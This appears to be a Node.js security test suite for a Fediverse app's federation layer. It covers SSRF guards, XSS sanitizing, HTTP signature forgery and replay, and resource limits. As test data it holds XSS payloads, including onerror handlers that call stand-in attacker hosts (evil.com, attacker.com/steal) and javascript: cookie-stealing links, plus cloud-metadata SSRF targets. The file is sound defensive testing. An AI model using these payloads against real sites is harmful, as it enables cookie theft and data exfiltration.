import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import http from 'node:http';
import { prisma } from '../src/db/PrismaClientSingleton.ts';
import { buildApp } from '../src/app.ts';
import { ssrfProtectionGuardService } from '../src/modules/federation/SsrfProtectionGuardService.ts';
import { resolveRemoteActorService } from '../src/modules/federation/ResolveRemoteActorService.ts';
import { activityPubKeyManagerService } from '../src/modules/federation/ActivityPubKeyManagerService.ts';
import { httpSignatureVerifierService } from '../src/modules/federation/HttpSignatureVerifierService.ts';
import { sanitizeFederatedHtml } from '../src/modules/federation/SanitizeFederatedHtml.ts';

test('TASK-19 Security Audit & Penetration Testing Suite: Fediverse Deepening', async (t) => {
  process.env.NODE_ENV = 'test';
  process.env.ALLOW_HTTP_FEDERATION = 'true';

  const app = await buildApp();
  await app.ready();

  const timestamp = Date.now();
  const testDomain = 'localhost:3001';

  // Seed local test user & local test post for inbound like/announce tests
  const alice = await prisma.user.create({
    data: {
      username: `alice_fed_sec_${timestamp}`,
      email: `alice_fed_sec_${timestamp}@pulse.social`,
      displayName: 'Alice Federation Auditor',
    },
  });

  const localPost = await prisma.post.create({
    data: {
      authorId: alice.id,
      content: `Local test post for federation audit ${timestamp}`,
      likesCount: 0,
      repostsCount: 0,
    },
  });

  // Legitimate remote actor (Charlie on mastodon.audit)
  const charlieKey = activityPubKeyManagerService.generateRsa2048KeyPair();
  const charlieDomain = 'mastodon.audit';
  const charlieUsername = `charlie_${timestamp}`;
  const charlieActorUri = `https://${charlieDomain}/users/${charlieUsername}`;
  const charlieKeyId = `${charlieActorUri}#main-key`;
  const charlieInboxUrl = `https://${charlieDomain}/users/${charlieUsername}/inbox`;

  await prisma.federatedActor.create({
    data: {
      uri: charlieActorUri,
      username: charlieUsername,
      domain: charlieDomain,
      name: 'Charlie Legitimate',
      inboxUrl: charlieInboxUrl,
      sharedInboxUrl: `https://${charlieDomain}/inbox`,
      publicKeyPem: charlieKey.publicKeyPem,
      publicKeyId: charlieKeyId,
    },
  });

  // Adversary remote actor (Eve on attacker.mock)
  const eveKey = activityPubKeyManagerService.generateRsa2048KeyPair();
  const eveDomain = 'attacker.mock';
  const eveUsername = `eve_${timestamp}`;
  const eveActorUri = `https://${eveDomain}/users/${eveUsername}`;
  const eveKeyId = `${eveActorUri}#main-key`;

  await prisma.federatedActor.create({
    data: {
      uri: eveActorUri,
      username: eveUsername,
      domain: eveDomain,
      name: 'Eve Adversary',
      inboxUrl: `https://${eveDomain}/users/${eveUsername}/inbox`,
      publicKeyPem: eveKey.publicKeyPem,
      publicKeyId: eveKeyId,
    },
  });

  // Helper to sign inbound requests
  function signRequest({
    method = 'POST',
    path = '/inbox',
    body = '',
    date = new Date().toUTCString(),
    privateKeyPem = charlieKey.privateKeyPem,
    keyId = charlieKeyId,
    host = testDomain,
    headersList = ['(request-target)', 'host', 'date', 'digest'],
  }) {
    const rawBodyBuffer = Buffer.from(body, 'utf-8');
    const digestBase64 = crypto.createHash('sha256').update(rawBodyBuffer).digest('base64');
    const digestHeader = `SHA-256=${digestBase64}`;

    const signingLines = [];
    for (const h of headersList) {
      if (h === '(request-target)') {
        signingLines.push(`(request-target): ${method.toLowerCase()} ${path}`);
      } else if (h === 'host') {
        signingLines.push(`host: ${host}`);
      } else if (h === 'date') {
        signingLines.push(`date: ${date}`);
      } else if (h === 'digest') {
        signingLines.push(`digest: ${digestHeader}`);
      }
    }

    const signingString = signingLines.join('\n');
    const signer = crypto.createSign('RSA-SHA256');
    signer.update(signingString);
    const signatureBase64 = signer.sign(privateKeyPem, 'base64');

    const signatureHeader = `keyId="${keyId}",algorithm="rsa-sha256",headers="${headersList.join(' ')}",signature="${signatureBase64}"`;

    return {
      Host: host,
      Date: date,
      Digest: digestHeader,
      Signature: signatureHeader,
      'Content-Type': 'application/activity+json',
      Accept: 'application/activity+json',
    };
  }

  // =========================================================================
  // VECTOR 1: SSRF DEFENSE ON REMOTE DISCOVERY & WEBFINGER
  // =========================================================================
  await t.test('AUDIT 1.1: SSRF Defense - POST /api/v1/federation/resolve blocks loopback IPv4 & IPv6 handles with HTTP 400', async () => {
    const loopbackHandles = [
      '@user@127.0.0.1',
      '@admin@127.0.0.2',
      '@root@localhost',
      '@user@[::1]',
      '@user@[::ffff:127.0.0.1]',
    ];

    for (const handle of loopbackHandles) {
      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/federation/resolve',
        payload: { handle },
      });

      assert.equal(res.statusCode, 400, `Handle ${handle} should be rejected with HTTP 400`);
      const body = res.json();
      assert.equal(body.success, false);
      assert.equal(body.error.code, 'SSRF_GUARD_BLOCKED', `Handle ${handle} should yield SSRF_GUARD_BLOCKED`);
    }
  });

  await t.test('AUDIT 1.2: SSRF Defense - POST /api/v1/federation/resolve blocks RFC 1918, CGNAT, and Link-Local with HTTP 400', async () => {
    const privateHandles = [
      '@internal@10.0.0.1',           // RFC 1918 10.0.0.0/8
      '@lan@172.16.0.1',             // RFC 1918 172.16.0.0/12
      '@subnet@172.31.255.254',      // RFC 1918 172.16.0.0/12
      '@router@192.168.1.1',         // RFC 1918 192.168.0.0/16
      '@cgnat@100.64.0.1',           // RFC 6598 Shared Address Space / CGNAT 100.64.0.0/10
      '@linklocal@169.254.10.20',    // Link-local 169.254.0.0/16
    ];

    for (const handle of privateHandles) {
      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/federation/resolve',
        payload: { handle },
      });

      assert.equal(res.statusCode, 400, `Private handle ${handle} must return HTTP 400`);
      assert.equal(res.json().error.code, 'SSRF_GUARD_BLOCKED');
    }
  });

  await t.test('AUDIT 1.3: SSRF Defense - Strict block on Cloud Metadata endpoints (AWS/GCP)', async () => {
    const cloudMetadataTargets = [
      '@attacker@169.254.169.254',
      '@gcp@metadata.google.internal',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::ffff:169.254.169.254]/latest/meta-data/',
    ];

    for (const target of cloudMetadataTargets) {
      const res = await app.inject({
        method: 'POST',
        url: '/api/v1/federation/resolve',
        payload: { handle: target },
      });

      assert.equal(res.statusCode, 400, `Cloud metadata target ${target} must return HTTP 400`);
      assert.equal(res.json().error.code, 'SSRF_GUARD_BLOCKED');
      assert.match(res.json().error.message, /SSRF_GUARD_BLOCKED/);
    }
  });

  await t.test('AUDIT 1.4: SSRF Defense - Direct invocation of resolveActor adheres strictly to SSRF guard', async () => {
    // Calling resolveActor directly without allowPrivateForTesting must reject private IPs
    await assert.rejects(
      async () => {
        await resolveRemoteActorService.resolveActor('@user@192.168.0.100');
      },
      (err) => {
        assert.equal(err.code, 'SSRF_GUARD_BLOCKED');
        assert.equal(err.statusCode, 400);
        return true;
      }
    );
  });

  // =========================================================================
  // VECTOR 2: STORED XSS IN REMOTE FEDERATED ACTOR PROFILE
  // =========================================================================
  await t.test('AUDIT 2.1: Stored XSS - Unit test sanitizeFederatedHtml across nested and evasion vectors', async () => {
    // 1. Script tag injection
    const scriptPayload = '<script>alert(1)</script>';
    assert.equal(sanitizeFederatedHtml(scriptPayload), '');

    // 2. Event handlers with quotes, without quotes, and with slash delimiters
    const imgPayload1 = '<img src=x onerror=fetch("http://evil.com")>';
    assert.equal(sanitizeFederatedHtml(imgPayload1), '<img src=x>');

    const imgPayload2 = '<img/src=x/onerror=alert(1)>';
    assert.equal(sanitizeFederatedHtml(imgPayload2), '<img/src=x>');

    // 3. Javascript: pseudo-protocols in href and src
    const linkPayload = '<a href="javascript:stealCookies()">Click me</a>';
    assert.equal(sanitizeFederatedHtml(linkPayload), '<a href="#">Click me</a>');

    // 4. Nested tag bypass evasion (<<script>script> or <scr<script>ipt>)
    const nestedPayload1 = '<<script>script>alert(1)</script>';
    const sanitized1 = sanitizeFederatedHtml(nestedPayload1);
    assert.ok(!sanitized1.includes('script>alert'), 'Must neutralize nested script tag');

    const nestedPayload2 = '<scr<script>ipt>alert(1)</script>';
    const sanitized2 = sanitizeFederatedHtml(nestedPayload2);
    assert.ok(!sanitized2.includes('<script>'), 'Must neutralize fragmented script tag');
  });

  await t.test('AUDIT 2.2: Stored XSS - Malicious Fediverse server returning XSS in name, summary, and preferredUsername', async () => {
    // Spin up a mock malicious Fediverse instance that returns XSS in its WebFinger & Actor JSON-LD
    const mockMaliciousServer = http.createServer((req, res) => {
      const url = new URL(req.url, `http://${req.headers.host}`);

      if (url.pathname.includes('/.well-known/webfinger')) {
        res.writeHead(200, { 'Content-Type': 'application/jrd+json' });
        res.end(
          JSON.stringify({
            subject: 'acct:pwned_user@localhost',
            links: [
              {
                rel: 'self',
                type: 'application/activity+json',
                href: `http://${req.headers.host}/users/pwned_user`,
              },
            ],
          })
        );
        return;
      }

      if (url.pathname.includes('/users/pwned_user')) {
        res.writeHead(200, { 'Content-Type': 'application/activity+json' });
        res.end(
          JSON.stringify({
            '@context': 'https://www.w3.org/ns/activitystreams',
            id: `http://${req.headers.host}/users/pwned_user`,
            type: 'Person',
            preferredUsername: "<script>alert('pwn_username')</script>",
            name: "<script>alert('pwn_name')</script>Evil Hacker",
            summary: "<img src=x onerror=fetch('http://attacker.com/steal')><a href=\"javascript:steal()\">Steal</a><b>Normal Bio</b><<script>script>test</script>",
            inbox: `http://${req.headers.host}/users/pwned_user/inbox`,
            publicKey: {
              id: `http://${req.headers.host}/users/pwned_user#main-key`,
              owner: `http://${req.headers.host}/users/pwned_user`,
              publicKeyPem: charlieKey.publicKeyPem,
            },
          })
        );
        return;
      }

      res.writeHead(404);
      res.end();
    });

    await new Promise((resolve) => mockMaliciousServer.listen(0, '127.0.0.1', resolve));
    const port = mockMaliciousServer.address().port;
    const maliciousHost = `127.0.0.1:${port}`;

    try {
      // Resolve actor using allowPrivateForTesting: true to simulate connection to the malicious server
      const result = await resolveRemoteActorService.resolveActor(
        `http://${maliciousHost}/users/pwned_user`,
        null,
        { allowPrivateForTesting: true }
      );

      // Verify returned user data is completely sanitized
      assert.ok(!result.user.displayName.includes('<script>'), 'user.displayName must not contain <script>');
      assert.ok(!result.user.bio.includes('onerror='), 'user.bio must not contain onerror=');
      assert.ok(!result.user.bio.includes('javascript:'), 'user.bio must not contain javascript:');
      assert.ok(!result.actor.username.includes('<script>'), 'actor.username must not contain <script>');

      // Verify database record in PostgreSQL (FederatedActor and User) is neutralized
      const dbActor = await prisma.federatedActor.findUnique({
        where: { uri: `http://${maliciousHost}/users/pwned_user` },
      });
      assert.ok(dbActor, 'FederatedActor must exist');
      assert.ok(!dbActor.name.includes('<script>'), 'dbActor.name must be sanitized');
      assert.ok(!dbActor.summary.includes('onerror='), 'dbActor.summary must be sanitized');
      assert.ok(!dbActor.username.includes('<script>'), 'dbActor.username must be sanitized');

      const dbUser = await prisma.user.findFirst({
        where: { federatedActorId: dbActor.id },
      });
      assert.ok(dbUser, 'Shadow User must exist');
      assert.ok(!dbUser.displayName.includes('<script>'), 'dbUser.displayName must be sanitized');
      assert.ok(!dbUser.bio.includes('onerror='), 'dbUser.bio must be sanitized');
    } finally {
      await new Promise((resolve) => mockMaliciousServer.close(resolve));
    }
  });

  // =========================================================================
  // VECTOR 3: HTTP SIGNATURE CRYPTOGRAPHIC VERIFICATION & REPLAY ATTACK DEFENSE
  // =========================================================================
  await t.test('AUDIT 3.1: Inbound Like & Announce must enforce required signed headers (request-target, host, date, digest)', async () => {
    const likePayload = JSON.stringify({
      '@context': 'https://www.w3.org/ns/activitystreams',
      id: `https://${charlieDomain}/activities/like/missing_headers_${timestamp}`,
      type: 'Like',
      actor: charlieActorUri,
      object: `http://${testDomain}/posts/${localPost.id}`,
    });

    // Attacker sends signature that only signs 'date'
    const strippedHeaders = signRequest({
      body: likePayload,
      headersList: ['date'],
    });

    const res = await app.inject({
      method: 'POST',
      url: '/inbox',
      headers: strippedHeaders,
      payload: likePayload,
    });

    assert.equal(res.statusCode, 401);
    assert.match(res.json().error.message, /MISSING_REQUIRED_SIGNED_HEADER/);
  });

  await t.test('AUDIT 3.2: Replay Attack Defense - Replayed Inbound Like signature is strictly rejected', async () => {
    const likePayload = JSON.stringify({
      '@context': 'https://www.w3.org/ns/activitystreams',
      id: `https://${charlieDomain}/activities/like/replay_${timestamp}`,
      type: 'Like',
      actor: charlieActorUri,
      object: `http://${testDomain}/posts/${localPost.id}`,
    });

    const signedHeaders = signRequest({
      body: likePayload,
    });

    // 1st delivery: accepted
    const res1 = await app.inject({
      method: 'POST',
      url: '/inbox',
      headers: signedHeaders,
      payload: likePayload,
    });
    assert.equal(res1.statusCode, 202);

    // 2nd delivery (replayed with identical signature): rejected with HTTP 401 REPLAY_ATTACK_DETECTED
    const res2 = await app.inject({
      method: 'POST',
      url: '/inbox',
      headers: signedHeaders,
      payload: likePayload,
    });
    assert.equal(res2.statusCode, 401);
    assert.match(res2.json().error.message, /REPLAY_ATTACK_DETECTED/);
  });

  await t.test('AUDIT 3.3: Identity Binding - Eve cannot forge Charlie Inbound Like or Announce by signing with Eve key', async () => {
    const impersonatedAnnounce = JSON.stringify({
      '@context': 'https://www.w3.org/ns/activitystreams',
      id: `https://${charlieDomain}/activities/announce/forged_${timestamp}`,
      type: 'Announce',
      actor: charlieActorUri, // Charlie is the spoofed author
      object: `http://${testDomain}/posts/${localPost.id}`,
    });

    // Eve signs payload using Eve's own private key
    const eveSignedHeaders = signRequest({
      body: impersonatedAnnounce,
      privateKeyPem: eveKey.privateKeyPem,
      keyId: eveKeyId,
    });

    const res = await app.inject({
      method: 'POST',
      url: '/inbox',
      headers: eveSignedHeaders,
      payload: impersonatedAnnounce,
    });

    // Must be rejected with HTTP 403 ACTOR_SIGNATURE_MISMATCH
    assert.equal(res.statusCode, 403);
    assert.equal(res.json().error.code, 'ACTOR_SIGNATURE_MISMATCH');
  });

  await t.test('AUDIT 3.4: Legitimate Inbound Like & Announce lifecycle and counter atomicity', async () => {
    // Send valid Inbound Like from Charlie
    const likeId = `https://${charlieDomain}/activities/like/valid_${timestamp}`;
    const likePayload = JSON.stringify({
      '@context': 'https://www.w3.org/ns/activitystreams',
      id: likeId,
      type: 'Like',
      actor: charlieActorUri,
      object: `http://${testDomain}/posts/${localPost.id}`,
    });

    const likeHeaders = signRequest({
      body: likePayload,
    });

    const likeRes = await app.inject({
      method: 'POST',
      url: '/inbox',
      headers: likeHeaders,
      payload: likePayload,
    });
    assert.equal(likeRes.statusCode, 202);

    // Verify post likesCount incremented to 1
    const postAfterLike = await prisma.post.findUnique({
      where: { id: localPost.id },
    });
    assert.equal(postAfterLike.likesCount, 1);

    // Send valid Inbound Undo(Like) from Charlie
    const undoLikePayload = JSON.stringify({
      '@context': 'https://www.w3.org/ns/activitystreams',
      id: `https://${charlieDomain}/activities/undo-like/${timestamp}`,
      type: 'Undo',
      actor: charlieActorUri,
      object: {
        id: likeId,
        type: 'Like',
        actor: charlieActorUri,
        object: `http://${testDomain}/posts/${localPost.id}`,
      },
    });

    const undoHeaders = signRequest({
      body: undoLikePayload,
    });

    const undoRes = await app.inject({
      method: 'POST',
      url: '/inbox',
      headers: undoHeaders,
      payload: undoLikePayload,
    });
    assert.equal(undoRes.statusCode, 202);

    // Verify post likesCount decremented back to 0
    const postAfterUndo = await prisma.post.findUnique({
      where: { id: localPost.id },
    });
    assert.equal(postAfterUndo.likesCount, 0);
  });

  // =========================================================================
  // VECTOR 4: RESOURCE EXHAUSTION DEFENSE (DOS MITIGATIONS)
  // =========================================================================
  await t.test('AUDIT 4.1: Resource Exhaustion - Response size limiter strictly caps remote responses at 1MB', async () => {
    // Mock server that returns a stream exceeding 1MB (e.g. 2MB)
    const largeStreamServer = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/activity+json' });
      const chunk = Buffer.alloc(64 * 1024, 'X'); // 64KB per chunk
      for (let i = 0; i < 32; i++) {
        res.write(chunk); // Total 2MB
      }
      res.end();
    });

    await new Promise((resolve) => largeStreamServer.listen(0, '127.0.0.1', resolve));
    const port = largeStreamServer.address().port;

    try {
      await assert.rejects(
        async () => {
          await ssrfProtectionGuardService.safeFederatedFetch(
            `http://127.0.0.1:${port}/oversized-actor`,
            {
              allowPrivateForTesting: true,
              maxResponseSizeBytes: 1024 * 1024, // 1MB limit
            }
          );
        },
        (err) => {
          assert.match(err.message, /RESOURCE_EXHAUSTION/);
          return true;
        }
      );
    } finally {
      await new Promise((resolve) => largeStreamServer.close(resolve));
    }
  });

  await t.test('AUDIT 4.2: Resource Exhaustion - Socket connection timeout aborts hanging requests', async () => {
    // Mock server that accepts connection but never responds
    const hangingServer = http.createServer((req, res) => {
      // Hang indefinitely
    });

    await new Promise((resolve) => hangingServer.listen(0, '127.0.0.1', resolve));
    const port = hangingServer.address().port;

    try {
      await assert.rejects(
        async () => {
          await ssrfProtectionGuardService.safeFederatedFetch(
            `http://127.0.0.1:${port}/hanging-endpoint`,
            {
              allowPrivateForTesting: true,
              timeoutMs: 150, // Short timeout for test speed
            }
          );
        },
        (err) => {
          assert.match(err.message, /REQUEST_TIMEOUT/);
          return true;
        }
      );
    } finally {
      await new Promise((resolve) => hangingServer.close(resolve));
    }
  });
});
